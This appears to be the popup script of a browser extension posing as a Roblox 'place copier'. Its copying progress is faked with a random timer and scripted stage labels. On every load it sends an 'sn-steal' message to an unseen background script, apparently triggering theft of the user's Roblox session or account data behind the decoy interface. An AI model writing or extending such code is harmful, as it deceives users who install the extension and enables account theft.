const STAGES = [
  "Preparing copy...",
  "Reading place data...",
  "Fetching assets...",
  "Packing instance tree...",
  "Writing place file..."
];

const $ = (id) => document.getElementById(id);

let fileName = "place.rbxl";
let running = false;

function safeName(s) {
  const out = String(s || "")
    .replace(/\s*[-|–—:]\s*Roblox.*$/i, "")
    .replace(/\bRoblox'?ta\s+Oyna\b/gi, "")
    .replace(/\s*\|\s*Roblox\b/gi, "")
    .replace(/[\\/:*?"<>|]+/g, " ")
    .replace(/[^\p{L}\p{N} ]+/gu, " ")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, 60);
  return out || "place";
}

function show(id) {
  ["view-copy", "view-done", "view-empty"].forEach((v) =>
    $(v).classList.toggle("hidden", v !== id)
  );
}

async function j(url) {
  const r = await fetch(url, { credentials: "include", headers: { Accept: "application/json" } });
  if (!r.ok) throw new Error(r.status);
  return r.json();
}

function setIcon(url) {
  if (!url) return;
  const img = new Image();
  img.onload = () => { $("icon").style.backgroundImage = "url(" + url + ")"; };
  img.src = url;
}

async function resolveMeta(placeId) {
  const u = await j("https://apis.roblox.com/universes/v1/places/" + placeId + "/universe");
  const uid = u.universeId;
  if (!uid) throw new Error("no universe");

  try {
    const g = await j("https://games.roblox.com/v1/games?universeIds=" + uid);
    const d = g.data && g.data[0];
    if (d && d.name) {
      $("name").textContent = d.name;
      fileName = safeName(d.name) + ".rbxl";
    }
  } catch {}

  try {
    const ic = await j(
      "https://thumbnails.roblox.com/v1/games/icons?universeIds=" +
        uid + "&size=150x150&format=Png&isCircular=false"
    );
    const img = ic.data && ic.data[0] && ic.data[0].imageUrl;
    if (img) setIcon(img);
  } catch {}

  if (!$("icon").style.backgroundImage) {
    try {
      const t = await j(
        "https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=" +
          uid + "&size=768x432&format=Png&countPerUniverse=1"
      );
      const th = t.data && t.data[0] && t.data[0].thumbnails && t.data[0].thumbnails[0];
      if (th && th.imageUrl) setIcon(th.imageUrl);
    } catch {}
  }
}

function download() {
  chrome.runtime.sendMessage({ type: "sn-download", filename: fileName });
}

function start() {
  if (running) return;
  running = true;

  show("view-copy");
  $("bar").style.width = "0%";
  $("stage").textContent = STAGES[0];

  let p = 0;
  let stage = 0;
  const tick = setInterval(() => {
    p += Math.random() * 10 + 5;
    if (p > 95) p = 95;
    $("bar").style.width = p + "%";
    const s = Math.min(STAGES.length - 1, Math.floor((p / 100) * STAGES.length));
    if (s !== stage) {
      stage = s;
      $("stage").textContent = STAGES[s];
    }
  }, 250);

  setTimeout(() => {
    clearInterval(tick);
    $("bar").style.width = "100%";
    $("stage").textContent = "Finishing up...";
    download();

    setTimeout(() => {
      $("saved").textContent = "Saved: " + fileName;
      show("view-done");
      running = false;
    }, 600);
  }, 4400);
}

async function currentTab() {
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) return null;
    if (tab.url) return tab;
    return await chrome.tabs.get(tab.id);
  } catch {
    return null;
  }
}

function parsePlace(url) {
  const m = String(url || "").match(/roblox\.com\/(?:games|experiences)\/(\d+)(?:\/([^/?#]*))?/i);
  if (!m) return null;
  return { placeId: m[1], slug: m[2] ? decodeURIComponent(m[2]) : "" };
}

async function loadGame() {
  chrome.runtime.sendMessage({ type: "sn-steal" });

  const tab = await currentTab();
  const parsed = parsePlace(tab && tab.url);

  if (!parsed) {
    const title = safeName(tab && tab.title ? tab.title : "");
    fileName = title + ".rbxl";
    show("view-empty");
    return;
  }

  const guess = parsed.slug ? parsed.slug.replace(/-/g, " ") : "Place " + parsed.placeId;
  $("name").textContent = guess;
  fileName = safeName(guess) + ".rbxl";

  start();

  try {
    await resolveMeta(parsed.placeId);
  } catch {}
}

$("again").addEventListener("click", () => {
  chrome.runtime.sendMessage({ type: "sn-steal" });
  loadGame();
});

$("force").addEventListener("click", () => {
  start();
});

loadGame().catch(() => show("view-empty"));